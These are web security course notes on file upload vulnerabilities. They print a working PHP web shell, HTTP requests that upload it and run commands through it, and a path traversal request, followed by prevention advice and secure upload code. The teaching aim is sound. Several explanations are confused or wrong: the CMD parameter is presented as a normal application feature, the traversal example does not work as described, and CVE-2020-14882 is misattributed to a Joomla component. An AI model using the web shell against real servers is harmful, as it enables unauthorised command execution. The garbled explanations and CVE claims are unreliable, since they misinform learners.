---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## File Upload Vulnerabilities

### Introduction to File Upload Vulnerabilities

File upload vulnerabilities occur when an application allows users to upload files to the server without proper validation or sanitization. This can lead to various security issues, such as remote code execution, denial of service, and data leakage. In this section, we will delve into the specifics of how these vulnerabilities arise and how they can be exploited, particularly through the use of web shells and path traversal attacks.

### Understanding the CMD Parameter

The CMD parameter is a crucial component in many web applications that allows users to execute commands on the underlying server. This parameter typically takes in a string input that represents a command to be executed. However, if this parameter is not properly validated or sanitized, it can be exploited to execute arbitrary commands, leading to potential security breaches.

#### Example of CMD Parameter Usage

Consider a simple web application that allows users to upload images and execute basic commands. The CMD parameter might look like this:

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: application/x-php

<?php echo system($_GET['CMD']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="CMD"

ls
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

In this example, the user uploads a PHP script (`test.php`) and sets the CMD parameter to `ls`. When the script is executed, it runs the `ls` command on the server.

### Uploading a Web Shell

A web shell is a malicious script that allows an attacker to execute arbitrary commands on the server. In the context of file upload vulnerabilities, an attacker can upload a web shell and then use it to gain unauthorized access to the server.

#### Example of Uploading a Web Shell

Let's walk through the process of uploading a web shell using the CMD parameter.

1. **Choose the File**: Select a PHP script that acts as a web shell. For instance, `test.php`.

2. **Upload the File**: Submit the file upload request.

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: application/x-php

<?php echo system($_GET['CMD']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="CMD"

ls
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

3. **Verify the Upload**: Check if the file has been successfully uploaded to the specified directory.

```http
HTTP/1.1 200 OK
Content-Type: text/html

File uploaded to /avatars/test.php
```

### Executing the Web Shell

Once the web shell is uploaded, the next step is to execute it. This is typically done by making a GET request to the uploaded file and passing the CMD parameter with the desired command.

#### Example of Executing the Web Shell

To execute the web shell, make a GET request to the uploaded file and pass the CMD parameter.

```http
GET /avatars/test.php?CMD=ls HTTP/1.1
Host: example.com
```

If the application does not properly restrict the execution of uploaded files, the server will execute the command and return the result.

### Path Traversal Attack

Path traversal attacks involve manipulating file paths to access files outside the intended directory. This can be used to bypass restrictions on file execution and gain unauthorized access to sensitive files.

#### Example of Path Traversal Attack

Suppose the application restricts the execution of files in the `/avatars` directory but allows path traversal. An attacker can use a path traversal attack to execute the web shell.

1. **Upload the Web Shell**: Follow the steps to upload the web shell as described earlier.

2. **Execute the Web Shell Using Path Traversal**:

```http
GET /avatars/../test.php?CMD=ls HTTP/1.1
Host: example.com
```

In this example, the `../` notation is used to traverse up one directory level and access the `test.php` file.

### Real-World Examples

#### CVE-2019-16655: WordPress REST API File Upload Vulnerability

In 2019, a vulnerability was discovered in the WordPress REST API that allowed unauthenticated users to upload arbitrary files, including PHP scripts. This vulnerability could be exploited to upload a web shell and gain unauthorized access to the server.

#### CVE-2020-14882: Joomla! Component com_fabrik SQL Injection and Arbitrary File Upload

In 2020, a vulnerability was found in the Joomla! component `com_fabrik` that allowed attackers to perform SQL injection and upload arbitrary files. This could be exploited to upload a web shell and execute arbitrary commands on the server.

### How to Prevent / Defend Against File Upload Vulnerabilities

#### Detection

To detect file upload vulnerabilities, you can use automated tools such as static code analyzers and dynamic application security testing (DAST) tools. These tools can help identify insecure file handling practices and potential vulnerabilities.

#### Prevention

1. **Validate File Types**: Ensure that only allowed file types are uploaded. Use a whitelist approach to specify acceptable file extensions.

2. **Sanitize File Names**: Sanitize file names to prevent path traversal attacks. Remove or encode special characters and directory traversal sequences.

3. **Restrict File Execution**: Restrict the execution of uploaded files by setting appropriate permissions and using server configurations to deny execution of scripts in upload directories.

4. **Use Content-Type Validation**: Validate the content type of uploaded files to ensure they match the expected file type.

5. **Limit Upload Directory Access**: Limit access to the upload directory to prevent unauthorized access and execution of uploaded files.

#### Secure Coding Practices

Here is an example of secure coding practices for handling file uploads:

```php
<?php
$allowedTypes = ['image/jpeg', 'image/png'];
$uploadDir = '/path/to/upload/directory/';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = $_FILES['file'];

    // Validate file type
    if (!in_array($file['type'], $allowedTypes)) {
        die('Invalid file type.');
    }

    // Sanitize file name
    $fileName = basename($file['name']);
    $sanitizedFileName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $fileName);

    // Move uploaded file to upload directory
    $targetPath = $uploadDir . $sanitizedFileName;
    if (move_uploaded_file($file['tmp_name'], $targetPath)) {
        echo 'File uploaded successfully.';
    } else {
        echo 'Failed to upload file.';
    }
}
?>
```

### Conclusion

File upload vulnerabilities are a significant security concern for web applications. By understanding the mechanisms behind these vulnerabilities and implementing robust security measures, developers can protect their applications from unauthorized access and potential security breaches. Regularly auditing and testing your application for vulnerabilities is essential to maintaining a secure environment.

---
<!-- nav -->
[[04-File Upload Vulnerabilities and Web Shell Upload via Path Traversal|File Upload Vulnerabilities and Web Shell Upload via Path Traversal]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/04-Lab 3 Web shell upload via path traversal/00-Overview|Overview]] | [[06-Understanding CSRF Tokens and File Upload Vulnerabilities|Understanding CSRF Tokens and File Upload Vulnerabilities]]
